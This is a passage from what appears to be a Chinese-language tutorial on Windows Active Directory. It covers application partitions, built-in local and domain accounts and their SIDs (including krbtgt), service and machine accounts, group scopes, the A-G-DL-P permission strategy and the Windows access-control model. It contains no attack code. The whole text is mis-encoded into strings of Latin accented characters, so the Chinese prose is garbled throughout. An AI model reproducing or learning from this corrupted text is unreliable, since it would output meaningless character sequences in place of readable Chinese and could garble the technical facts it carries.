åˆ°å®ä¾‹ä¸­ã€‚è¾…åŠ©ç±»ä¸èƒ½å®ä¾‹åŒ–ä½†æ˜¯å¯ä»¥ä»ç°æœ‰çš„è¾…åŠ©ç±»æˆ–æŠ½è±¡ç±»ä¸­ç»§æ‰¿ã€‚è¾…åŠ©ç±»è§„å®šäº†å¯¹è±¡å®ä½“çš„æ‰©å±•å±æ€§ï¼Œè™½ç„¶æ¯ä¸ªæ¡ç›®åªå±äºä¸€ä¸ªç»“æ„å¯¹è±¡ç±»ï¼Œä½†æ˜¯å¯ä»¥åŒæ—¶å±äºå¤šä¸ªè¾…åŠ©å¯¹è±¡ç±» å¦å¤–è¿˜æœ‰ä¸ª88ç±»ï¼Œä¸å±äºä¸Šè¿°ä»»ä½•ç±»åˆ«ï¼Œå¯ä»¥ç”¨ä½œæŠ½è±¡ç±»ã€ç»“æ„ç±»æˆ–è¾…åŠ©ç±»ï¼Œå…¶ä¸‹çš„ç±»å¯ä»¥ç»§æ‰¿è‡ªæ‰€æœ‰ç±»\nåº”ç”¨ç¨‹åºåˆ†åŒº åº”ç”¨ç¨‹åºåˆ†åŒºï¼ˆApplication NCï¼‰æ˜¯å¾®è½¯ä»windows server 2003å¼€å§‹å¼•å…¥çš„ï¼Œå®ƒå…è®¸ç”¨æˆ·è‡ªå®šä¹‰åˆ†åŒºæ¥æ‰©å±•ç›®å½•åˆ†åŒºã€‚å®ƒæä¾›äº†å¤åˆ¶æ§åˆ¶èŒƒå›´çš„èƒ½åŠ›ï¼Œå¹¶å…è®¸ä»¥æ›´é€‚åˆåŠ¨æ€æ•°æ®çš„æ–¹å¼é˜²æ­¢å‰¯æœ¬ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåº”ç”¨ç¨‹åºåˆ†åŒºä¼šè¢«å¤åˆ¶åˆ°æ—ä¸­ç‰¹å®šçš„åŸŸæ§ä¸Šè€Œä¸æ˜¯æ‰€æœ‰åŸŸæ§\nå¦‚å›¾ ï¼ŒDC=DomainDnsZones,DC=yuy0ung,DC=comå’ŒDC=ForestDnsZones,DC=yuy0ung,DC=comå°±æ˜¯åº”ç”¨ç¨‹åºåˆ†åŒºï¼š\nåº”ç”¨ç¨‹åºåˆ†åŒºæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\nå¦‚æœç”¨æˆ·æƒ³è¦å®šä¹‰ä¸€ä¸ªåˆ†åŒºï¼Œå¯ä»¥ä½¿ç”¨åº”ç”¨ç¨‹åºåˆ†åŒº åº”ç”¨ç¨‹åºåˆ†åŒºå¯ä»¥å­˜å‚¨åŠ¨æ€å¯¹è±¡ã€‚åŠ¨æ€å¯¹è±¡æ˜¯å…·æœ‰ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰å€¼çš„å¯¹è±¡ï¼ŒTTLå€¼å¯ä»¥ç¡®å®šä»–ä»¬åœ¨è¢«æ´»åŠ¨ç›®å½•è‡ªåŠ¨åˆ é™¤ä¹‹å‰å°†å­˜åœ¨å¤šé•¿æ—¶é—´ åŸŸå†…è´¦æˆ· æœ¬åœ°è´¦æˆ· æœ¬åœ°è´¦æˆ·ï¼ˆLocal Accountï¼‰å­˜å‚¨åœ¨æœ¬åœ°çš„æœåŠ¡å™¨ä¸Šï¼Œè¿™äº›è´¦æˆ·å¯ä»¥åœ¨æœ¬åœ°æœåŠ¡å™¨ä¸Šåˆ†é…æƒé™ä½†ä»…é™è¯¥æœåŠ¡å™¨ã€‚é»˜è®¤çš„æœ¬åœ°è´¦æˆ·æ˜¯å†…ç½®è´¦æˆ·ï¼ˆå¦‚Administratorã€Guestç­‰ï¼‰ï¼Œåœ¨å®‰è£…windowsæ—¶è‡ªåŠ¨åˆ›å»ºä¸”æ— æ³•åˆ é™¤ã€‚é»˜è®¤çš„æœ¬åœ°è´¦æˆ·ä¸æä¾›å¯¹ç½‘ç»œèµ„æºçš„è®¿é—®ï¼Œæ ¹æ®åˆ†é…ç»™è¯¥è´¦æˆ·çš„æƒé™æ¥ç®¡ç†å¯¹æœ¬åœ°æœåŠ¡å™¨èµ„æºçš„è®¿é—®æœ¬åœ°è´¦æˆ·å‡ä½äºâ€œç”¨æˆ·â€æ–‡ä»¶å¤¹\nadministrator windowså®‰è£…è¿‡ç¨‹ä¸­åˆ›å»ºçš„ç¬¬ä¸€ä¸ªè´¦æˆ·å°±æ˜¯administratorè´¦æˆ·ï¼ŒSIDä¸ºS-1-5-21-XX-500ï¼Œæ˜¯é»˜è®¤çš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ï¼Œåœ¨æœ¬åœ°ç®¡ç†å‘˜ç»„administratorsä¸­ï¼Œè¯¥è´¦æˆ·å¯ä»¥å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ï¼Œå¹¶æ ¹æ®éœ€è¦å‘ç”¨æˆ·åˆ†é…ç”¨æˆ·æƒé™å’Œè®¿é—®æ§åˆ¶æƒé™ï¼Œæ¯å°è®¡ç®—æœºéƒ½æœ‰è¯¥è´¦æˆ·ï¼Œä¸èƒ½åˆ é™¤æˆ–é”å®šé»˜è®¤çš„Administratorè´¦æˆ·ï¼Œä½†å¯ä»¥é‡å‘½åæˆ–ç¦ç”¨ä»–ï¼ˆå³ä½¿é‡å‘½åadministratorä¹Ÿä¸ä¼šæ”¹å˜å…¶SIDï¼‰\né«˜ç‰ˆæœ¬çš„windowsé»˜è®¤ç¦ç”¨äº†administratorï¼Œåˆ›å»ºäº†ä½œä¸ºadministratorsæˆå‘˜çš„å¦ä¸€ä¸ªæœ¬åœ°è´¦æˆ·ï¼Œå¯ä»¥è¿è¡Œå…·æœ‰æå‡æƒé™çš„åº”ç”¨ç¨‹åºè€Œä¸æ˜¯ä½¿ç”¨â€è¿è¡Œä¸ºç®¡ç†å‘˜â€œé€‰é¡¹\nguest è¯¥è´¦æˆ·åŒæ ·ä¼šåœ¨windowså®‰è£…è¿‡ç¨‹åˆ›å»ºï¼ŒSIDä¸ºS-1-5-21-XX-501ï¼Œä½†è¯¥è´¦æˆ·é»˜è®¤ç¦ç”¨ã€‚guestè´¦æˆ·å…è®¸åœ¨è®¡ç®—æœºä¸Šæ²¡æœ‰è´¦æˆ·çš„ä¸´æ—¶ç”¨æˆ·ç™»é™†æœ¬åœ°æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯ä¸»æœºï¼Œé»˜è®¤æƒ…å†µä¸‹è¯¥è´¦æˆ·å¯†ç ä¸ºç©º\ndefaultaccount è¢«ç§°ä¸ºé»˜è®¤ç³»ç»Ÿç®¡ç†è´¦æˆ·DSMAï¼Œè¯¥è´¦æˆ·æ˜¯åœ¨windows 10ç‰ˆæœ¬1607å’Œwindows server 2016ä¸­å¼•å…¥çš„å†…ç½®è´¦æˆ·ï¼ŒDSMAæ˜¯ä¸€ä¸ªç”¨æˆ·ä¸­ç«‹çš„è´¦æˆ·ï¼Œå¯ä»¥ç”¨äºè¿è¡Œå¤šç”¨æˆ·æ„ŸçŸ¥æˆ–ä¸ç”¨æˆ·æ— å…³çš„è¿›ç¨‹ã€‚DSMAåœ¨æ¡Œé¢SKUå’Œwindows server 2016ä¸­é»˜è®¤è¢«ç¦ç”¨\nDSMAæœ‰ä¸ªè‘—åçš„RIDä¸º503ï¼Œæ‰€ä»¥ä»–çš„SIDæ ¼å¼ï¼šS-1-5-21-XX-503ï¼ŒDSMAæ˜¯System Managed Account Groupç»„çš„æˆå‘˜ï¼Œè¯¥ç»„æ‹¥æœ‰çš„SIDä¸ºSID-1-5-32-581\nWDAGUtilityAccount è¯¥è´¦æˆ·æ˜¯windowsç³»ç»Ÿä¸ºwindows defenderåº”ç”¨ç¨‹åºé˜²æŠ¤æ–¹æ¡ˆç®¡ç†å’Œä½¿ç”¨çš„ç”¨æˆ·è´¦æˆ·ï¼Œæ˜¯åœ¨win10 1709å’Œwin server 2019ä¸­å¼•å…¥çš„å†…ç½®è´¦æˆ·ã€‚é™¤éåœ¨è®¾å¤‡ä¸Šå¯ç”¨äº†åº”ç”¨ç¨‹åºé˜²æŠ¤ï¼Œå¦åˆ™é»˜è®¤ä¿æŒç¦ç”¨ï¼Œå®ƒåŒæ ·æœ‰ä¸ªè‘—åRIDï¼š504ï¼Œæ‰€ä»¥SIDæ ¼å¼ï¼šS-1-5-21-XX-504\næ´»åŠ¨ç›®å½•è´¦æˆ· å³æ´»åŠ¨ç›®å½•ä¸­çš„è´¦æˆ·ï¼Œå­˜å‚¨åœ¨æ´»åŠ¨ç›®å½•æ•°æ®åº“ä¸­ï¼Œåˆ†ä¸ºç”¨æˆ·è´¦æˆ·ã€æœåŠ¡è´¦æˆ·ã€æœºå™¨è´¦æˆ·ï¼Œä¸‰è€…å…³ç³»å¦‚ä¸‹ï¼š\nåŒºåˆ†æœåŠ¡è´¦æˆ·å°±æ˜¯çœ‹å…¶æ˜¯å¦æ³¨å†Œäº†SPNï¼ŒåŒºåˆ†æœºå™¨è´¦æˆ·å°±æ˜¯çœ‹objectcategoryå±æ€§æ˜¯å¦ä¸ºcomputer\nç”¨æˆ·è´¦æˆ· å°±æ˜¯åŸŸå†…ç”¨æˆ·çš„è´¦æˆ·ï¼Œå­˜å‚¨åœ¨æ´»åŠ¨ç›®å½•æ•°æ®åº“ï¼ˆNtds.ditæ–‡ä»¶ï¼‰ä¸­ã€‚åŸŸå†…æ‰€æœ‰ç”¨æˆ·è´¦æˆ·å‡åœ¨åŸŸå…¨å±€ç»„Domain Userså†…\nåŸŸæ§ä¸Šçš„æœ¬åœ°è´¦æˆ·\næœåŠ¡å™¨å‡çº§æˆDCåï¼Œæœ¬åœ°æ™®é€šè´¦æˆ·å°†å˜æˆåŸŸæ™®é€šè´¦æˆ·ï¼Œåœ¨æ´»åŠ¨ç›®å½•ä¸­æœ‰å¯¹åº”çš„è´¦æˆ·ï¼Œå­˜å‚¨åœ¨Userså®¹å™¨ä¸­ï¼Œè€Œæœ¬åœ°ç®¡ç†å‘˜ç»„administratorsä¸­çš„ç”¨æˆ·å°†å‡çº§ä¸ºåŸŸç®¡ç†å‘˜ç»„Domain Adminså†…çš„ç”¨æˆ·ï¼Œé»˜è®¤æœ¬åœ°ç®¡ç†å‘˜administratorå°†å‡çº§ä¸ºåŸŸé»˜è®¤ç®¡ç†å‘˜administratorï¼Œå¹¶éœ€è¦è®¾ç½®ç¬¦åˆå¼ºåº¦çš„å¯†ç ï¼Œæ­¤åè¿™äº›è´¦æˆ·å‡å…·æœ‰åŸŸèŒƒå›´çš„è®¿é—®æƒé™ï¼Œè®¿é—®æ—¶åŠ ä¸ŠåŸŸå‰ç¼€å³å¯\nAdministratorè´¦æˆ·\næ˜¯ADä¸­administratorsã€Domain Adminsã€Enterprise Adminsã€ç»„ç­–ç•¥åˆ›å»ºè€…ã€Schema Admin Groupsçš„é»˜è®¤æˆå‘˜ï¼ŒSIDä¸ºS-1-5-[domain]-500\nGuestè´¦æˆ·\nè¯¥è´¦æˆ·ä¸éœ€è¦å¯†ç ï¼Œé»˜è®¤ç¦ç”¨ï¼ŒSIDä¸ºS-1-5-[domain]-501\nkrbtgtè´¦æˆ·\næ˜¯ä¸€ä¸ªæœ¬åœ°é»˜è®¤è´¦æˆ·ï¼Œä¸ºå¯†é’¥å‘è¡Œä¸­å¿ƒï¼ˆKDCï¼‰æœåŠ¡è´¦æˆ·ï¼ŒRIDä¸º502ï¼ŒSIDä¸ºS-1-5-[domain]-502\nåœ¨æˆ‘å‰é¢kerberosçš„ä»‹ç»æ–‡ç« ä¸­æåˆ°è¿‡ï¼šwindowsåè®®ä¹‹kerberosï¼Œè¯¥è´¦æˆ·æ˜¯krbtgtå®‰å…¨ä¸»ä½“çš„å®ä½“ï¼Œåœ¨kerberosèº«ä»½è®¤è¯çš„AS-REPæ­¥éª¤ä¸­ï¼ŒKDCè¿”å›çš„TGTæ˜¯ç”±krbtgtçš„ç”¨æˆ·hashåŠ å¯†çš„ï¼Œè€Œkrbtgtè´¦æˆ·çš„hashåªæœ‰KDCçŸ¥é“ï¼Œè¯¥è´¦æˆ·æ— æ³•åˆ é™¤æˆ–æ”¹å\næœåŠ¡è´¦æˆ· æ˜¯æ˜¾å¼åˆ›å»ºçš„ç”¨æˆ·è´¦æˆ·ï¼Œæ—¨åœ¨ä¸ºåœ¨windowsæœåŠ¡å™¨æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œçš„æœåŠ¡æä¾›å®‰å…¨ä¸Šä¸‹æ–‡\né»˜è®¤æƒ…å†µä¸‹ï¼ŒåŸŸä¸­æ¯ä¸ªæœºå™¨æœ‰SPNï¼Œå¹¶ä¸”å…¶æœåŠ¡è´¦æˆ·å°±æ˜¯å…¶æœºå™¨è´¦æˆ·\nç”¨æˆ·è´¦æˆ·å¯ä»¥æ˜¯æœåŠ¡è´¦æˆ·ï¼Œæœºå™¨è´¦æˆ·ä¹Ÿå¯ä»¥æ˜¯æœåŠ¡è´¦æˆ·ï¼Œä»–ä»¬æ˜¯å¦å±äºæœåŠ¡è´¦æˆ·å–å†³äºè¯¥è´¦æˆ·æ˜¯å¦åœ¨åŸŸå†…æ³¨å†Œäº†SPN\næœºå™¨è´¦æˆ· ä¸èƒ½ç”¨äºç™»å½•ï¼Œå¯ä»¥ä»£è¡¨ä¸€ä¸ªç‰©ç†å®ä½“æ¯”å¦‚åŸŸå†…æœºå™¨\nåœ¨åŸŸå†…ï¼Œæœºå™¨è´¦æˆ·åŸŸä¸åŸŸç”¨æˆ·ä¸€æ ·ä¹Ÿæ˜¯åŸŸå†…æˆå‘˜ï¼Œåœ¨åŸŸå†…çš„ç”¨æˆ·åæ˜¯æœºå™¨è´¦æˆ·å+$ï¼Œæ¯”å¦‚win10æœºå™¨è´¦æˆ·ä¸ºWin10$ï¼Œè¿™ä¸ªå€¼å¯ä»¥åœ¨æœºå™¨è´¦æˆ·çš„samAccountNameå±æ€§ä¸­çœ‹åˆ°ï¼Œå®ƒåœ¨æœ¬åœ°çš„ç”¨æˆ·åæ˜¯System\næœºå™¨åŠ å…¥åŸŸåï¼Œä¼šå°†æœºå™¨è´¦æˆ·çš„å¯†ç åŒæ­¥åˆ°åŸŸæ§å¹¶ä¿å­˜åœ¨åŸŸæ§çš„Ntds.ditä¸­ï¼Œç”±äºæœºå™¨è´¦æˆ·çš„å¯†ç æ˜¯ç³»ç»Ÿéšæœºç”Ÿæˆçš„ï¼Œå¼ºåº¦æ˜¯120ä¸ªå­—ç¬¦ï¼Œä¸”ä¼šå®šæ—¶æ›´æ–°ï¼Œå› æ­¤å³ä½¿è·å¾—äº†æœºå™¨è´¦æˆ·å¯†ç hashï¼Œä¹Ÿå‡ ä¹æ— æ³•è¿˜åŸå‡ºæœºå™¨è´¦æˆ·çš„æ˜æ–‡å£ä»¤\nåŸŸå†…æƒé™åˆ’åˆ† ç»„ ç»„(Group)æ˜¯ç”¨æˆ·è´¦å·çš„é›†åˆã€‚åˆ†ä¸ºé€šè®¯ç»„å’Œå®‰å…¨ç»„\né€šè®¯ç»„å°±æ˜¯ä¸€ä¸ªé€šä¿¡ç¾¤ç»„ï¼Œå‘ä¸€ä¸ªé€šè®¯ç»„å‘æ¶ˆæ¯å¯ä»¥è®©ç»„å†…æ‰€æœ‰ç”¨æˆ·éƒ½æ¥æ”¶æ¶ˆæ¯\nå®‰å…¨ç»„æ˜¯ç”¨æˆ·æƒé™çš„é›†åˆï¼Œé€šè¿‡å‘ç»„åˆ†é…æƒé™ï¼Œå°±å¯ä»¥ä¸å¿…å‘æ¯ä¸ªç”¨æˆ·åˆ†åˆ«åˆ†é…æƒé™ã€‚ä¾‹å¦‚ï¼Œç®¡ç†å‘˜åœ¨æ—¥å¸¸å·¥ä½œä¸­ï¼Œä¸å¿…ä¸ºå•ä¸ªç”¨æˆ·è´¦å·è®¾ç½®ç‹¬ç‰¹çš„è®¿é—®æƒé™ï¼Œåªéœ€è¦å°†ç”¨æˆ·è´¦æ”¾åˆ°ç›¸åº”çš„å®‰å…¨ç»„ä¸­ã€‚ç®¡ç†å‘˜é€šè¿‡é…ç½®å®‰å…¨ç»„è®¿é—®æƒé™,å°±å¯ä»¥ä¸ºæ‰€æœ‰åŠ å…¥å®‰å…¨ç»„çš„ç”¨æˆ·è´¦å·é…ç½®åŒæ ·çš„æƒé™ã€‚ä½¿ç”¨å®‰å…¨ç»„è€Œä¸æ˜¯å•ä¸ªçš„ç”¨æˆ·è´¦å·,å¯ä»¥å¤§å¤§ç®€åŒ–ç½‘ç»œçš„ç»´æŠ¤å’Œç®¡ç†å·¥ä½œ\nå®‰å…¨ç»„å¯ä»¥åˆ†ä¸ºåŸŸæœ¬åœ°ç»„ã€å…¨å±€ç»„ã€é€šç”¨ç»„\nåŸŸæœ¬åœ°ç»„ åŸŸæœ¬åœ°ç»„æˆå‘˜æ¥è‡ªæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œé€šç”¨ç»„ä»¥åŠæœ¬åŸŸä¸­çš„åŸŸæœ¬åœ°ç»„ï¼Œåœ¨æœ¬åŸŸèŒƒå›´å†…å¯ç”¨ï¼ˆæ¥è‡ªå…¨æ—,ä½œç”¨äºæœ¬åŸŸ;ï¼‰\né‡è¦çš„åŸŸæœ¬åœ°ç»„ï¼š\nç®¡ç†å‘˜ç»„( Administrators)çš„æˆå‘˜å¯ä»¥ä¸å—é™åˆ¶åœ°å­˜å–è®¡ç®—æœº/åŸŸçš„èµ„æºã€‚å®ƒä¸ä»…æ˜¯æœ€å…·æƒåŠ›çš„ä¸€ä¸ªç»„,ä¹Ÿæ˜¯åœ¨æ´»åŠ¨ç›®å½•å’ŒåŸŸæ§åˆ¶å™¨ä¸­é»˜è®¤å…·æœ‰ç®¡ç†å‘˜æƒé™ç»„ã€‚è¯¥ç»„çš„æˆå‘˜å¯ä»¥æ›´æ”¹ Enterprise Adminsã€ Schema adminså’Œ Domain adminsç»„çš„æˆå‘˜å…³ç³»,æ˜¯åŸŸæ£®æ—ä¸­å¼ºå¤§çš„æœåŠ¡ç®¡ç†ç»„\nè¿œç¨‹ç™»å½•ç»„( Remote Desktop Users)çš„æˆå‘˜å…·æœ‰è¿œç¨‹ç™»å½•æƒé™\næ‰“å°æœºæ“ä½œå‘˜ç»„( Print Operators)çš„æˆå‘˜å¯ä»¥ç®¡ç†ç½‘ç»œæ‰“å°æœº,åŒ…æ‹¬å»ºç«‹ã€ç®¡ç†åŠåˆ é™¤ç½‘ç»œæ‰“å°æœº,å¹¶å¯ä»¥åœ¨æœ¬åœ°ç™»å½•å’Œå…³é—­åŸŸæ§åˆ¶å™¨\nè´¦å·æ“ä½œå‘˜ç»„( Account Operators)çš„æˆå‘˜å¯ä»¥åˆ›å»ºå’Œç®¡ç†è¯¥åŸŸä¸­çš„ç”¨æˆ·å’Œç»„å¹¶ä¸ºå…¶è®¾ç½®æƒé™,ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°ç™»å½•åŸŸæ§åˆ¶å™¨,ä½†æ˜¯,ä¸èƒ½æ›´æ”¹å±äº Administratorsæˆ– Domain adminsç»„ çš„è´¦æˆ·,ä¹Ÿä¸èƒ½ä¿®æ”¹è¿™äº›ç»„ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹,è¯¥ç»„ä¸­æ²¡æœ‰æˆå‘˜\næœåŠ¡å™¨æ“ä½œå‘˜ç»„( Server Operators)çš„æˆå‘˜å¯ä»¥ç®¡ç†åŸŸæœåŠ¡å™¨,å…¶æƒé™åŒ…æ‹¬å»ºç«‹ç®¡ç†åˆ é™¤ ä»»æ„æœåŠ¡å™¨çš„å…±äº«ç›®å½•ã€ç®¡ç†ç½‘ç»œæ‰“å°æœºã€å¤‡ä»½ä»»ä½•æœåŠ¡å™¨çš„æ–‡ä»¶ã€æ ¼å¼åŒ–æœåŠ¡å™¨ç¡¬ç›˜ é”å®šæœåŠ¡å™¨ã€å˜æ›´æœåŠ¡å™¨çš„ç³»ç»Ÿæ—¶é—´ã€å…³é—­åŸŸæ§åˆ¶å™¨ç­‰ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹,è¯¥ç»„ä¸­æ²¡æœ‰æˆå‘˜\nå¤‡ä»½æ“ä½œå‘˜ç»„( Backup Operators)çš„æˆå‘˜å¯ä»¥åœ¨åŸŸæ§åˆ¶å™¨ä¸­æ‰§è¡Œå¤‡ä»½å’Œè¿˜åŸæ“ä½œ,å¹¶å¯ä»¥åœ¨æœ¬åœ°ç™»å½•å’Œå…³é—­åŸŸæ§åˆ¶å™¨ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹,è¯¥ç»„ä¸­æ²¡æœ‰æˆå‘˜\nå…¨å±€ç»„ å…¨å±€ç»„æˆå‘˜æ¥è‡ªäºåŒä¸€åŸŸçš„ç”¨æˆ·è´¦æˆ·å’Œå…¨å±€ç»„ï¼Œåœ¨æ—èŒƒå›´å†…å¯ç”¨ï¼ˆæ¥è‡ªæœ¬åŸŸ,ä½œç”¨äºå…¨æ—;ï¼‰\né€šç”¨ç»„ é€šç”¨ç»„æˆå‘˜æ¥è‡ªæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œåœ¨å…¨æ—èŒƒå›´å†…å¯ç”¨ï¼ˆæ¥è‡ªå…¨æ—,ä½œç”¨äºå…¨æ—ï¼‰ä½†å‡ ä¹å¾ˆå°‘ä½¿ç”¨\nä¸¾ä¾‹ æ¥ä¸ªæƒé™é…ç½®æ¡ˆä¾‹ï¼š\næœ‰ä¸‰ä¸ªåŸŸhack.com(åœ¨åŒ—äº¬)ï¼Œsh.hack.com(åœ¨ä¸Šæµ·)ï¼Œgz.hack.com(åœ¨å¹¿å·)ç»„æˆåŸŸæ ‘ï¼Œç„¶ååŒ—äº¬è´¢åŠ¡éƒ¨é—¨ï¼Œéœ€è¦è¿›è¡Œç»“ç®—ï¼Œä½†æ˜¯æ•°æ®åœ¨åŒ—äº¬çš„ä¸€å°æœåŠ¡å™¨ä¸Šæƒé™æ¯”è¾ƒé«˜åªæœ‰åŒ—äº¬è´¢åŠ¡äººå‘˜å¯ä»¥ä½¿ç”¨ï¼ŒåŒæ—¶å› ä¸ºåŒ—äº¬äººæ•°ä¸å¤Ÿï¼Œéœ€è¦ä¸Šæµ·å’Œå¹¿å·æ”¯æ´ï¼Œå¦‚ä½•åˆ†é…æƒé™ï¼Ÿ\nåªéœ€è¦åœ¨åŒ—äº¬çš„å»ºç«‹ä¸€ä¸ªåŸŸæœ¬åœ°ç»„ï¼Œç„¶åèµ‹äºˆåŸŸæœ¬åœ°ç»„æƒé™å¯ä»¥è®¿é—®è´¢åŠ¡çš„æ•°æ®æœºå™¨\nåœ¨ä¸Šæµ·å’Œå¹¿å·åˆ†åˆ«å»ºç«‹å…¨å±€ç»„\nåœ¨åŒ—äº¬çš„åŸŸæ§ä¸Šå°†ä¸Šæµ·å’Œå¹¿å·çš„å…¨å±€ç»„åŠ å…¥è¿›æ¥\nå¦‚å›¾ï¼š\nå¦‚æ­¤ï¼Œå³å¯å¾ˆæ–¹ä¾¿çš„è¿›è¡Œæƒé™åˆ†é…ä¸æ§åˆ¶ï¼Œè€Œè¿™é‡Œå°±è¿ç”¨åˆ°äº†ç»å…¸çš„A-G-DL-Pç­–ç•¥\nA-G-DL-Pç­–ç•¥ A-G-DL-Pç­–ç•¥æ˜¯æŒ‡å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­,å°†å…¨å±€ç»„æ·»åŠ åˆ°åŸŸæœ¬åœ°ç»„ä¸­,ç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™\nAè¡¨ç¤ºç”¨æˆ·è´¦å·( Account )\nGè¡¨ç¤ºå…¨å±€ç»„( Global Group )\nUè¡¨ç¤ºé€šç”¨ç»„( Universal Group )\nDLè¡¨ç¤ºåŸŸæœ¬åœ°ç»„( Domain Local Group )\nPè¡¨ç¤ºèµ„æºæƒé™( Permission,è®¸å¯ )\næŒ‰ç…§AG-DL-Pç­–ç•¥å¯¹ç”¨æˆ·è¿›è¡Œç»„ç»‡å’Œç®¡ç†æ˜¯éå¸¸å®¹æ˜“çš„ã€‚åœ¨AGDL-Pç­–ç•¥å½¢æˆä»¥å,å½“éœ€è¦ç»™ä¸€ä¸ªç”¨æˆ·æ·»åŠ æŸä¸ªæƒé™æ—¶,åªè¦æŠŠè¿™ä¸ªç”¨æˆ·æ·»åŠ åˆ°æŸä¸ªæœ¬åœ°åŸŸç»„ä¸­å°±å¯ä»¥äº†\nå®é™…ä¸Šï¼ŒåŸŸç®¡ç†å‘˜æƒé™çš„é…ç½®ä¹Ÿä½¿ç”¨äº†A-G-DL-Pç­–ç•¥ï¼šç”¨æˆ· -- Domain Admin -- administrator -- åŸŸç®¡ç†æƒé™\nè®¿é—®æ§åˆ¶ æŒ‡windowsæ“ä½œç³»ç»Ÿä½¿ç”¨å†…ç½®æˆæƒå’Œè®¿é—®æ§åˆ¶æŠ€æœ¯ï¼Œç¡®å®šç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·å¯¹è±¡æ˜¯å¦å…·æœ‰è®¿é—®èµ„æºçš„æ­£ç¡®æƒé™ï¼Œä»¥æ§åˆ¶ä¸»ä½“ï¼ˆprincipalï¼‰æ“ä½œï¼ˆè¯»å–ã€å†™å…¥ã€åˆ é™¤ã€æ›´æ”¹ç­‰ï¼‰å¯¹è±¡ï¼ˆobjectï¼‰çš„è¡Œä¸ºæ˜¯å¦å…·æœ‰åˆæ³•æƒé™\nè®¿é—®ä¸»ä½“é€šå¸¸æŒ‡å®‰å…¨ä¸»ä½“ï¼Œæ˜¯ä»»ä½•å¯ä»¥é€šè¿‡æ“ä½œç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯çš„å®ä½“ï¼Œï¼Œå¦‚ç”¨æˆ·è´¦æˆ·ã€è®¡ç®—æœºè´¦æˆ·ã€åœ¨ç”¨æˆ·æˆ–è®¡ç®—æœºè´¦æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œçš„çº¿ç¨‹æˆ–è¿›ç¨‹ï¼Œä»¥åŠè¿™äº›è´¦æˆ·çš„å®‰å…¨ç»„ç­‰\nè¢«è®¿é—®çš„å¯¹è±¡é€šå¸¸æŒ‡å®‰å…¨å¯¹è±¡ï¼Œå¯èƒ½æ˜¯æ–‡ä»¶ã€æ–‡ä»¶å¤¹ã€æ‰“å°æœºã€æ³¨å†Œè¡¨é¡¹ã€å…±äº«æœåŠ¡ã€ADDSå¯¹è±¡ç­‰\nå½“ç»è¿‡èº«ä»½éªŒè¯çš„å®‰å…¨ä¸»ä½“æƒ³è®¿é—®å®‰å…¨å¯¹è±¡æ—¶ï¼Œwindowsä¼šä¸ºå®‰å…¨ä¸»ä½“åˆ›å»ºä¸€ä¸ªè®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†éªŒè¯è¿‡ç¨‹è¿”å›çš„SIDï¼ˆå®‰å…¨æ ‡è¯†ç¬¦ï¼‰å’Œæœ¬åœ°å®‰å…¨ç­–ç•¥åˆ†é…ç»™ç”¨æˆ·çš„ç”¨æˆ·å®‰å…¨åˆ—è¡¨ï¼›å½“å®‰å…¨å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œwindowsä¼šä¸ºå…¶åˆ›å»ºä¸€ä¸ªå®‰å…¨æè¿°ç¬¦ï¼ˆsecurity descriptorï¼‰\nwindowsçš„è®¿é—®æ§åˆ¶æ­£æ˜¯å®‰å…¨ä¸»ä½“çš„è®¿é—®ä»¤ç‰Œä¸­çš„ä¿¡æ¯ä¸å®‰å…¨å¯¹è±¡çš„å®‰å…¨æè¿°ç¬¦ä¸­çš„è®¿é—®æ§åˆ¶é¡¹è¿›è¡Œæ¯”è¾ƒåšå‡ºè®¿é—®å†³ç­–çš„\nwindowsè®¿é—®æ§åˆ¶æ¨¡å‹ Accsess Control Modelï¼Œæ˜¯windowsç³»ç»Ÿå®‰å…¨æ€§çš„åŸºç¡€æ„ä»¶ï¼Œä¸»è¦ç”±è®¿é—®ä»¤ç‰Œå’Œå®‰å…¨æè¿°ç¬¦æ„æˆï¼Œåˆ†åˆ«ç”±è®¿é—®è€…å’Œè¢«è®¿é—®è€…æŒæœ‰ã€‚é€šè¿‡æ¯”è¾ƒè®¿é—®ä»¤ç‰Œå’Œå®‰å…¨æè¿°ç¬¦çš„å†…å®¹ï¼Œwindowså¯ä»¥åˆ¤æ–­è®¿é—®è€…æ˜¯å¦æœ‰è®¿é—®å¯¹è±¡çš„èƒ½åŠ›\nè®¿é—®ä»¤ç‰Œ ç”¨æˆ·ç™»é™†æ—¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œé€šè¿‡åwindowsä¸ºç”¨æˆ·åˆ›å»ºè®¿é—®ä»¤ç‰Œï¼Œæ­¤åä»£è¡¨è¯¥ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰æ­¤è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ï¼Œæ¯å½“çº¿ç¨‹æˆ–è¿›ç¨‹ä¸å®‰å…¨å¯¹è±¡äº¤äº’æˆ–å°è¯•æ‰§è¡Œéœ€è¦ç‰¹æƒçš„ç³»ç»Ÿä»»åŠ¡ï¼Œwindowséƒ½ä¼šä½¿ç”¨æ­¤è®¿é—®ä»¤ç‰Œæ 